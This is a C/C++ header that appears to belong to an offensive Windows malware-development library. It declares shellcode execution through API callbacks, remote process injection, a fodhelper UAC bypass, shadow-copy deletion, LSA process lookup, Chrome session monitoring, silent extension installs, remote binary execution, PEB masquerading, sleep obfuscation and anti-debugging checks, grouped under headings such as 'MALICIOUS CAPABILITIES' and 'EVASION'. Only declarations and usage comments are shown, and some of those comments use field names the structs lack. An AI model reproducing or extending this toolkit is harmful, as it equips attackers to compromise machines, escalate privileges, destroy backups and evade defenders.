#pragma once
#include "Internal.h"
#include "StringManipulation.h"
#include "FunctionDeclaration.h"
#include <Ws2tcpip.h>
#include <Dbghelp.h> 
#include <wincrypt.h>
#include <shlwapi.h>
#include <Shlobj.h>
#include <sddl.h>
#include <wtsapi32.h>
#include <psapi.h>
#include <powrprof.h>
#include <Iphlpapi.h>
#include <icmpapi.h>
#include <windns.h>
#include <tlhelp32.h>
#include <stdio.h>


#pragma comment(lib, "Dnsapi.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "Urlmon.lib")
#pragma comment(lib, "PowrProf.lib")
#pragma comment(lib, "Ws2_32.lib")


#ifndef NT_SUCCESS
#define NT_SUCCESS(x) ((x)>=0)
#define STATUS_SUCCESS ((NTSTATUS)0)
#endif

#define Get16Bits(d) ((((UINT32)(((CONST UINT8*)(d))[1])) << 8) +(UINT32)(((CONST UINT8*)(d))[0]))

#define InlineGetCurrentThread ((HANDLE)(LONG_PTR)-2)
#define InlineGetCurrentProcess (HANDLE)((HANDLE)-1)


/*******************************************
 SHELLCODE VIA CALLBACK ROUTINE INFORMATION
*******************************************/

/*

    LPBYTE Payload
        a pointer to shellcode
    DWORD dwLengthOfPayloadInBytes
        the length of the payload in bytes
    Enum SHELLCODE_EXECUTION_METHOD
        specifies shellcode execution method
        

    example:
    SHELLCODE_EXECUTION_INFORMATION Sei = { 0 };
    Sei.Payload = Shellcode; //pointer to shellcode
    Sei.dwLengthOfPayloadInBytes = 280; //whatever the length is
    Sei.Method = E_CERTENUMSYSTEMSTORE; //method from SHELLCODE_EXECUTION_METHOD
*/

typedef enum SHELLCODE_EXECUTION_METHOD {
    E_CDEFFOLDERMENU_CREATE2 = 1,
    E_CERTENUMSYSTEMSTORE, //2
    E_CERTENUMSYSTEMSTORELOCATION, //3
    E_CERTFINDCHAININSTORE, //4 UNSTABLE, FAILS
    E_ENUMCHILDWINDOWS, //5
    E_ENUMDATEFORMATSW, //6
    E_ENUMDESKTOPWINDOWS, //7
    E_ENUMDESKTOPSW, //8
    E_ENUMDIRTREEW, //9
    E_ENUMDISPLAYMONITORS, //10
    E_ENUMFONTFAMILIESEXW, //11
    E_ENUMFONTSW, //12
    E_ENUMICMPROFILESW, //13 UNSTABLE, FAILS
    E_ENUMLANGUAGEGROUPLOCALESW, //14
    E_ENUMOBJECTS, //15
    E_ENUMPROPSEXW, //16 NOT IMPLEMENTED!
    E_ENUMRESOURCETYPESEXW, //17
    E_ENUMSYSTEMCODEPAGES, //18
    E_ENUMSYSTEMGEOID, //19
    E_ENUMSYSTEMLANGUAGEGROUPS, //20
    E_ENUMSYSTEMLOCALESEX, //20
    E_ENUMTHREADWINDOWS, //21
    E_ENUMTIMEFORMATSEX, //22
    E_ENUMUILANGUAGESW, //23
    E_ENUMWINDOWSTATIONSW, //24
    E_ENUMWINDOWS, //25
    E_ENUMPROPSW, //26 UNSTABLE, FAILS
    E_MESSAGEBOXINDIRECT, //27 UNSTABLE, FAILS
    E_PERFSTARTPROVIDEREX, //28 UNSTABLE, FAILS
    E_MINIDUMPWRITEDUMP, //29 UNSTABLE, FAILS
    E_ENUMERATELOADEDMODULES, //30
    E_ENUMPAGEFILESW, //31
    E_ENUMPWRSCHEMES, //32
    E_DNSQUERYEX, //33
    E_RTLUSERFIBERSTART //34 UNSTABLE, FAILS
}SHELLCODE_EXECUTION_METHOD, *PSHELLCODE_EXECUTION_METHOD;

typedef struct __SHELLCODE_EXECUTION_INFORMATION {
    LPBYTE Payload;
    DWORD dwLengthOfPayloadInBytes;
    DWORD MethodEnum;
}SHELLCODE_EXECUTION_INFORMATION, * PSHELLCODE_EXECUTION_INFORMATION;

/*******************************************
 RAD HARDWARE BREAKPOINT HOOKING ENGINE DATA
*******************************************/
typedef struct __HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL {
    PVOID HandlerObject;
    BOOL IsInit;
}HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL, * PHARDWARE_ENGINE_INIT_SETTINGS_GLOBAL;

typedef uintptr_t PUINT_VAR_T;
typedef void (WINAPI* EXCEPTION_CALLBACK)(PEXCEPTION_POINTERS);

typedef struct DESCRIPTOR_ENTRY {
    struct DESCRIPTOR_ENTRY* Next;
    struct DESCRIPTOR_ENTRY* Previous;
    PUINT_VAR_T Address;
    DWORD Position;
    DWORD Tid;
    BOOL Dis;
    EXCEPTION_CALLBACK CallbackRoutine;
}DESCRIPTOR_ENTRY, *PDESCRIPTOR_ENTRY;

inline CRITICAL_SECTION CriticalSection = { 0 };
inline DESCRIPTOR_ENTRY* Head = NULL;
inline HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL GlobalHardwareBreakpointObject;

/*******************************************
 PROCESS INJECTION INFORMATION
*******************************************/

/*

    LPBYTE Payload
        a pointer to shellcode
    DWORD dwLengthOfPayloadInBytes
        the length of the payload in bytes
    Enum PROCESS_INJECTION_METHOD
        specifies process injection method
    DWORD TargetPid
        specify target process
    [OPTIONAL] DWORD ThreadId 
        specify target process thread id (depends PROCESS_INJECTION_METHOD)
    [OPTIONAL] TCHAR PathToFile //depends on if youre using W or A suffix
        path to DLL to load (depends PROCESS_INJECTION_METHOD)
        

    example:
    PROCESS_INJECTION_INFORMATION Pii = { 0 };
    Sei.Payload = Shellcode; //pointer to shellcode
    Pii.dwLengthOfPayloadInBytes = 280; //whatever the length is
    Pii.Method = E_PROCESSREFLECTION; //method from PROCESS_INJECTION_METHOD
    Pii.ProcessId = 100; //whatever the process id is, this is just a random number lol
    Pii.ThreadId = 0; //not required for this method
    Pii.PathToFile = DllPath; pointer to path of dll you want loaded, only WCHAR supported

*/

typedef enum PROCESS_INJECTION_METHOD {
    E_WRITEPROCESSMEMORY_CREATEREMOTETHREAD_EXECUTESHELLCODE, //0
    E_PROCESS_REFLECTION_EXECUTESHELLCODE, //1 UNIMPLEMENTED
    E_CTRL_INJECT //2
}PROCESS_INJECTION_METHOD, * PPROCESS_INJECTION_METHOD;

typedef struct __PROCESS_INJECTION_INFORMATION {
    LPBYTE Payload;
    DWORD dwLengthOfPayloadInBytes;
    DWORD MethodEnum;
    DWORD ProcessId;
    DWORD ThreadId;
    PWCHAR PathToFile;
}PROCESS_INJECTION_INFORMATION, *PPROCESS_INJECTION_INFORMATION;



/*******************************************
 ERROR HANDLING
*******************************************/
DWORD GetLastErrorFromTeb(VOID);
NTSTATUS GetLastNtStatusFromTeb(VOID);
VOID SetLastErrorInTeb(_In_ DWORD ErrorCode);
VOID SetLastNtStatusInTeb(_In_ NTSTATUS Status);
DWORD Win32FromHResult(_In_ HRESULT Result);
DWORD RtlNtStatusToDosErrorViaImport(_In_ NTSTATUS Status);



/*******************************************
 CRYPTOGRAPHY RELATED
*******************************************/
//#define TOKENIZE( x ) #x
//#define CONCAT3( X, Y, Z ) X##Y##Z
//#define HASHALGOA HashStringDjb2A
//#define hasha( VAL ) constexpr auto CONCAT3(hash,VAL,A) = HASHALGOA((PCHAR)TOKENIZE(VAL))
//#define hashw( VAL ) constexpr auto CONCAT3(hash,VAL,W) = HASHALGOA((PWCHAR)TOKENIZE(VAL))


DWORD HashStringDjb2A(_In_ PCHAR String);
DWORD HashStringDjb2W(_In_ PWCHAR String);
ULONG HashStringFowlerNollVoVariant1aA(_In_ PCHAR String);
ULONG HashStringFowlerNollVoVariant1aW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
DWORD HashStringLoseLoseA(_In_ PCHAR String);
DWORD HashStringLoseLoseW(_In_ PWCHAR String);
INT HashStringRotr32A(_In_ PCHAR String);
INT HashStringRotr32W(_In_ PWCHAR String);
DWORD HashStringSdbmA(_In_ PCHAR String);
DWORD HashStringSdbmW(_In_ PWCHAR String);
UINT32 HashStringSuperFastHashA(_In_ PCHAR String);
UINT32 HashStringSuperFastHashW(_In_ PWCHAR String);
INT HashStringUnknownGenericHash1A(_In_ PCHAR String);
INT HashStringUnknownGenericHash1W(_In_ PWCHAR String);
INT32 HashStringSipHashA(_In_ PCHAR String);
INT32 HashStringSipHashW(_In_ PWCHAR String);
INT32 HashStringMurmurA(_In_ PCHAR String);
INT32 HashStringMurmurW(_In_ PWCHAR String);
BOOL CreateMd5HashFromFilePathW(_In_ PWCHAR FilePath, _Inout_ PWCHAR Md5Hash);
BOOL CreateMd5HashFromFilePathA(_In_ PCHAR FilePath, _Inout_ PCHAR Md5Hash);
INT CreatePseudoRandomInteger(_In_ ULONG Seed);
PWCHAR CreatePseudoRandomStringW(_In_ SIZE_T dwLength, _In_ ULONG Seed);
PCHAR CreatePseudoRandomStringA(_In_ SIZE_T dwLength, _In_ ULONG Seed);
BOOL HashFileByMsiFileHashTableW(_In_ PWCHAR Path, _Inout_ PULONG FileHash);
BOOL HashFileByMsiFileHashTableA(_In_ PCHAR Path, _Inout_ PULONG FileHash);
ULONG CreatePseudoRandomIntegerFromNtdll(_In_ ULONG Seed);



/*******************************************
 LIBRARY LOADING
*******************************************/
PTEB GetTeb(VOID);
PPEB GetPeb(VOID);
PPEB GetPebFromTeb(VOID);
PKUSER_SHARED_DATA GetKUserSharedData(VOID);
PRTL_USER_PROCESS_PARAMETERS GetRtlUserProcessParameters(VOID);
DWORD64 __stdcall GetProcAddressDjb2(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressFowlerNollVoVariant1a(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressJenkinsOneAtATime32Bit(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressLoseLose(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressRotr32(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressSdbm(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressSuperFastHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressUnknownGenericHash1(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressSipHash(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressMurmur(_In_ DWORD64 ModuleBase, _In_ DWORD64 Hash);
DWORD64 __stdcall GetProcAddressA(_In_ DWORD64 ModuleBase, _In_ LPCSTR lpProcName);
DWORD64 __stdcall GetProcAddressW(_In_ DWORD64 ModuleBase, _In_ LPCWSTR lpProcName);
BOOL RtlLoadPeHeaders(_Inout_ PIMAGE_DOS_HEADER* Dos, _Inout_ PIMAGE_NT_HEADERS* Nt, _Inout_ PIMAGE_FILE_HEADER* File, _Inout_ PIMAGE_OPTIONAL_HEADER* Optional, _Inout_ PBYTE* ImageBase);
HMODULE GetModuleHandleEx2A(_In_ LPCSTR lpModuleName);
HMODULE GetModuleHandleEx2W(_In_ LPCWSTR lpModuleName);
HMODULE ProxyWorkItemLoadLibraryW(_In_ LPCWSTR lpModuleName);
HMODULE ProxyWorkItemLoadLibraryA(_In_ LPCSTR lpModuleName);
HMODULE ProxyRegisterWaitLoadLibraryW(_In_ LPCWSTR lpModuleName);
HMODULE ProxyRegisterWaitLoadLibraryA(_In_ LPCSTR lpModuleName);



/*******************************************
 HELPER FUNCTIONS
*******************************************/
BOOL IsPathValidA(_In_ PCHAR FilePath);
BOOL IsPathValidW(_In_ PWCHAR FilePath);
BOOL CreateLocalAppDataObjectPathW(_Inout_ PWCHAR pBuffer, _In_ PWCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
BOOL CreateLocalAppDataObjectPathA(_Inout_ PCHAR pBuffer, _In_ PCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
BOOL GetSystemWindowsDirectoryA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
BOOL GetSystemWindowsDirectoryW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
BOOL CreateWindowsObjectPathW(_Inout_ PWCHAR pBuffer, _In_ PWCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
BOOL CreateWindowsObjectPathA(_Inout_ PCHAR pBuffer, _In_ PCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
HANDLE GetProcessHeapFromTeb(VOID);
LPWSTR GetCurrentUserSidW(VOID);
LPSTR GetCurrentUserSidA(VOID);
DWORD GetProcessPathFromLoaderLoadModuleA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetProcessPathFromLoaderLoadModuleW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
DWORD GetProcessPathFromUserProcessParametersA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetProcessPathFromUserProcessParametersW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
BOOL RecursiveFindFileA(_In_ LPCSTR Path, _In_ LPCSTR Pattern);
BOOL RecursiveFindFileW(_In_ LPCWSTR Path, _In_ LPCWSTR Pattern);
BOOL DeleteFileWithCreateFileFlagA(_In_ PCHAR Path);
BOOL DeleteFileWithCreateFileFlagW(_In_ PWCHAR Path);
DWORD GetCurrentDirectoryFromUserProcessParametersA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetCurrentDirectoryFromUserProcessParametersW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
DWORD GetCurrentProcessIdFromTeb(VOID);
DWORD GetCurrentWindowTextFromUserProcessParametersA(_In_ DWORD nBufferLength, _Inout_ PCHAR lpBuffer);
DWORD GetCurrentWindowTextFromUserProcessParametersW(_In_ DWORD nBufferLength, _Inout_ PWCHAR lpBuffer);
LONGLONG GetFileSizeFromPathW(_In_ PWCHAR Path, _In_ DWORD dwFlagsAndAttributes);
LONGLONG GetFileSizeFromPathA(_In_ PCHAR Path, _In_ DWORD dwFlagsAndAttributes);
BOOL SetProcessPrivilegeToken(_In_ DWORD PrivilegeEnum);
BOOL IsDllLoadedW(_In_ LPCWSTR DllName);
BOOL IsDllLoadedA(_In_ LPCSTR DllName);
HMODULE TryLoadDllMultiMethodW(_In_ PWCHAR DllName);
HMODULE TryLoadDllMultiMethodA(_In_ PCHAR DllName);
DWORD CreateThreadAndWaitForCompletion(_In_ LPTHREAD_START_ROUTINE StartAddress, _In_ LPVOID Parameters, _In_ DWORD dwMilliseconds);
BOOL GetProcessBinaryNameFromHwndW(_In_ HWND ProcessHwnd, _Inout_ PWCHAR BinaryName, _In_ DWORD BufferSize);
BOOL GetProcessBinaryNameFromHwndA(_In_ HWND ProcessHwnd, _Inout_ PCHAR BinaryName, _In_ DWORD BufferSize);
BOOL GetByteArrayFromFileW(_Inout_ PBYTE Buffer, _In_ PWCHAR Path, _In_ ULONGLONG BytesToRead);
BOOL GetByteArrayFromFileA(_Inout_ PBYTE Buffer, _In_ PCHAR Path, _In_ ULONGLONG BytesToRead);
BOOL Ex_GetHandleOnDeviceHttpCommunication(_Out_ PHANDLE Handle);
DWORD IsRegistryKeyValidW(_In_ HKEY PredefinedKey, _In_ PWCHAR Path);
BOOL FastcallExecuteBinaryShellExecuteExW(_In_ PWCHAR FullPathToBinary, _In_ PWCHAR OptionalParameters);
BOOL FastcallExecuteBinaryShellExecuteExA(_In_ PCHAR FullPathToBinary, _In_ PCHAR OptionalParameters);
DWORD GetCurrentProcessIdFromOffset(VOID);
HMODULE GetPeFileBaseAddress(VOID);
DWORD64 LdrLoadGetProcedureAddress(VOID);



/*******************************************
 FINGERPRINTING
*******************************************/
LCID GetCurrentLocaleFromTeb(VOID);
DWORD GetNumberOfLinkedDlls(VOID);
BOOL IsNvidiaGraphicsCardPresentA(VOID);
BOOL IsNvidiaGraphicsCardPresentW(VOID);
BOOL IsProcessRunningA(_In_ PCHAR ProcessNameWithExtension);
BOOL IsProcessRunningW(_In_ PWCHAR ProcessNameWithExtension);
BOOL IsProcessRunningAsAdmin(VOID);
ULONG GetOsMajorVersionFromPeb(VOID);
ULONG GetOsMinorVersionFromPeb(VOID);
ULONG GetOsBuildNumberFromPeb(VOID);
ULONG GetOsPlatformIdFromPeb(VOID);
DWORD GetPidFromNtQuerySystemInformationW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromNtQuerySystemInformationA(_In_ PCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWindowsTerminalServiceW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWindowsTerminalServiceA(_In_ PCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWmiComInterfaceW(_In_ PWCHAR BinaryNameWithFileExtension);
DWORD GetPidFromWmiComInterfaceA(_In_ PCHAR BinaryNameWithFileExtension);
DWORD GetPidFromEnumProcessesW(_In_ PWCHAR ProcessNameWithExtension);
DWORD GetPidFromEnumProcessesA(_In_ PCHAR ProcessNameWithExtension);
DWORD GetPidFromPidBruteForcingW(_In_ PWCHAR ProcessNameWithExtension);
DWORD GetPidFromPidBruteForcingA(_In_ PCHAR ProcessNameWithExtension);
DWORD GetPidFromNtQueryFileInformationW(_In_ PWCHAR FullBinaryPath);
DWORD GetPidFromNtQueryFileInformationA(_In_ PCHAR FullBinaryPath);
DWORD GetPidFromPidBruteForcingExW(_In_ PWCHAR ProcessNameWithExtension);
DWORD GetPidFromPidBruteForcingExA(_In_ PCHAR ProcessNameWithExtension);



/*******************************************
 MALICIOUS CAPABILITIES
*******************************************/
DWORD OleGetClipboardDataA(_Inout_ PCHAR Buffer);
DWORD OleGetClipboardDataW(_Inout_ PWCHAR Buffer);
DWORD MpfComVssDeleteShadowVolumeBackups(_In_ BOOL CoUninitializeAfterCompletion);
BOOL MpfComModifyShortcutTargetW(_In_ PWCHAR LnkPath, _In_  PWCHAR LnkExecutionProperty);
BOOL MpfComModifyShortcutTargetA(_In_ PCHAR LnkPath, _In_  PCHAR LnkExecutionProperty);
BOOL UacBypassFodHelperMethodA(_In_ PCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi);
BOOL UacBypassFodHelperMethodW(_In_ PWCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi);
DWORD MpfGetLsaPidFromRegistry(VOID);
DWORD MpfGetLsaPidFromServiceManager(VOID);
DWORD MpfGetLsaPidFromNamedPipe(VOID);
BOOL ShellcodeExecutionViaFunctionCallbackMain(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
DWORD MpfComMonitorChromeSessionOnce(VOID);
DWORD MpfExecute64bitPeBinaryInMemoryFromByteArrayNoReloc(_In_ PBYTE BinaryImage);
BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR ExtensionIdentifier);
BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier);
BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii);
BOOL MpfProcessInjectionViaProcessReflection(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid);
BOOL MpfProcessInjectionViaCreateRemoteThread(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid);



/*******************************************
 EVASION
*******************************************/
BOOL CreateProcessWithCfGuardW(_Inout_ PPROCESS_INFORMATION Pi, _In_ PWCHAR Path);
BOOL CreateProcessWithCfGuardA(_Inout_ PPROCESS_INFORMATION Pi, _In_ PCHAR Path);
HRESULT CreateProcessFromIHxInteractiveUserW(_In_ PWCHAR UriFile);
HRESULT CreateProcessFromIHxInteractiveUserA(_In_ PCHAR UriFile);
HRESULT CreateProcessFromIHxHelpPaneServerW(_In_ PWCHAR UriFile);
HRESULT CreateProcessFromIHxHelpPaneServerA(_In_ PCHAR UriFile);
BOOL MasqueradePebAsExplorer(VOID);
BOOL CreateFileFromDsCopyFromSharedFileW(_In_ PWCHAR NewFileName, _In_ PWCHAR FileToClone);
BOOL CreateFileFromDsCopyFromSharedFileA(_In_ PCHAR NewFileName, _In_ PCHAR FileToClone);
BOOL DelayedExecutionExecuteOnDisplayOff(VOID);
DWORD CreateProcessFromShellExecuteInExplorerProcessW(_In_ PWCHAR BinaryPath);
DWORD CreateProcessFromShellExecuteInExplorerProcessA(_In_ PCHAR BinaryPath);
DWORD CreateProcessFromIShellDispatchInvokeW(_In_ PWCHAR BinaryPath);
DWORD CreateProcessFromIShellDispatchInvokeA(_In_ PCHAR BinaryPath);
DWORD CreateProcessViaNtCreateUserProcessW(PWCHAR FullBinaryPath);
DWORD CreateProcessViaNtCreateUserProcessA(PCHAR FullBinaryPath);
BOOL RemoveDllFromPebA(_In_ LPCSTR lpModuleName);
BOOL RemoveDllFromPebW(_In_ LPCWSTR lpModuleName);
BOOL HookEngineUnhookHeapFree(_In_ BOOL StartEngine);
BOOL HookEngineRestoreHeapFree(_In_ BOOL ShutdownEngine);
BOOL SleepObfuscationViaVirtualProtect(_In_ DWORD dwSleepTimeInMilliseconds, _In_ PUCHAR Key);
BOOL RemoveRegisterDllNotification(VOID);
DWORD CreateProcessByWindowsRHotKeyW(_In_ PWCHAR FullPathToBinary);
DWORD CreateProcessByWindowsRHotKeyA(_In_ PCHAR FullPathToBinary);
DWORD CreateProcessByWindowsRHotKeyExW(_In_ PWCHAR FullPathToBinary);
DWORD CreateProcessByWindowsRHotKeyExA(_In_ PCHAR FullPathToBinary);



/*******************************************
 ANTI-DEBUGGING
*******************************************/
BOOL AdfCloseHandleOnInvalidAddress(VOID);
BOOL AdfIsCreateProcessDebugEventCodeSet(VOID);
BOOL AdfOpenProcessOnCsrss(VOID);
BOOL IsIntelHardwareBreakpointPresent(VOID);
BOOL CheckRemoteDebuggerPresent2(_In_ HANDLE hHandle, _Inout_ PBOOL pbDebuggerPresent);
BOOL IsDebuggerPresentEx(VOID);



/*******************************************
 NETWORK CONNECTIVITY
*******************************************/
DWORD UrlDownloadToFileSynchronousW(_In_ PWCHAR Url, _In_ PWCHAR SavePath);
DWORD UrlDownloadToFileSynchronousA(_In_ PCHAR Url, _In_ PCHAR SavePath);
BOOL SendIcmpEchoMessageToIPv4HostW(_In_ PWCHAR IpAddress, _Inout_ PDWORD Status, _Inout_ PDWORD RoundTripTime, _Inout_ PWCHAR EchoReplyAddress);
BOOL SendIcmpEchoMessageToIPv4HostA(_In_ PCHAR IpAddress, _Inout_ PDWORD Status, _Inout_ PDWORD RoundTripTime, _Inout_ PCHAR EchoReplyAddress);
ULONG ConvertIPv4StringToUnsignedLongW(_In_ PWCHAR IpAddress);
ULONG ConvertIPv4StringToUnsignedLongA(_In_ PCHAR IpAddress);
BOOL ConvertIPv4IpAddressStructureToStringW(_In_ PIN_ADDR Address, _Out_ PWCHAR Buffer);
BOOL ConvertIPv4IpAddressStructureToStringA(_In_ PIN_ADDR Address, _Out_ PCHAR Buffer);
BOOL ConvertIPv4IpAddressUnsignedLongToStringW(_In_ ULONG Address, _Out_ PWCHAR Buffer);
BOOL ConvertIPv4IpAddressUnsignedLongToStringA(_In_ ULONG Address, _Out_ PCHAR Buffer);
DWORD DnsGetDomainNameIPv4AddressAsStringW(_In_ PWCHAR DomainName, _Inout_ PWCHAR IPv4IPAddress);
DWORD DnsGetDomainNameIPv4AddressAsStringA(_In_ PCHAR DomainName, _Inout_ PCHAR IPv4IPAddress);
ULONG DnsGetDomainNameIPv4AddressUnsignedLongW(_In_ PWCHAR DomainName);
ULONG DnsGetDomainNameIPv4AddressUnsignedLongA(_In_ PCHAR DomainName);
BOOL GetDomainNameFromUnsignedLongIPV4AddressW(_In_ ULONG IpAddress, _Inout_ PWCHAR DomainName);
BOOL GetDomainNameFromUnsignedLongIPV4AddressA(_In_ ULONG IpAddress, _Inout_ PCHAR DomainName);
BOOL GetDomainNameFromIPV4AddressAsStringW(_In_ PWCHAR IpAddress, _Inout_ PWCHAR DomainName);
BOOL GetDomainNameFromIPV4AddressAsStringA(_In_ PCHAR IpAddress, _Inout_ PCHAR DomainName);



/*******************************************
 RAD HARDWARE BREAKPOINT HOOKING ENGINE FUNCTIONS
*******************************************/
BOOL InitHardwareBreakpointEngine(VOID);
BOOL ShutdownHardwareBreakpointEngine(VOID);
LONG ExceptionHandlerCallbackRoutine(_In_ PEXCEPTION_POINTERS ExceptionInfo);
BOOL SetHardwareBreakpoint(_In_ DWORD ThreadId, _In_ PUINT_VAR_T Address, _In_ UINT Position, _In_ BOOL Init);
BOOL InsertDescriptorEntry(_In_ PUINT_VAR_T Address, _In_ DWORD Position, _In_ EXCEPTION_CALLBACK CallbackRoutine, _In_ DWORD Tid, _In_ BOOL Dis);
BOOL RemoveDescriptorEntry(_In_ PUINT_VAR_T Address, _In_ DWORD Tid);
BOOL SnapshotInsertHardwareBreakpointHookIntoTargetThread(_In_ PUINT_VAR_T Address, _In_ DWORD Position, _In_ BOOL Init, _In_ DWORD Tid);

INT __demonstration_WinMain(VOID); //hook sleep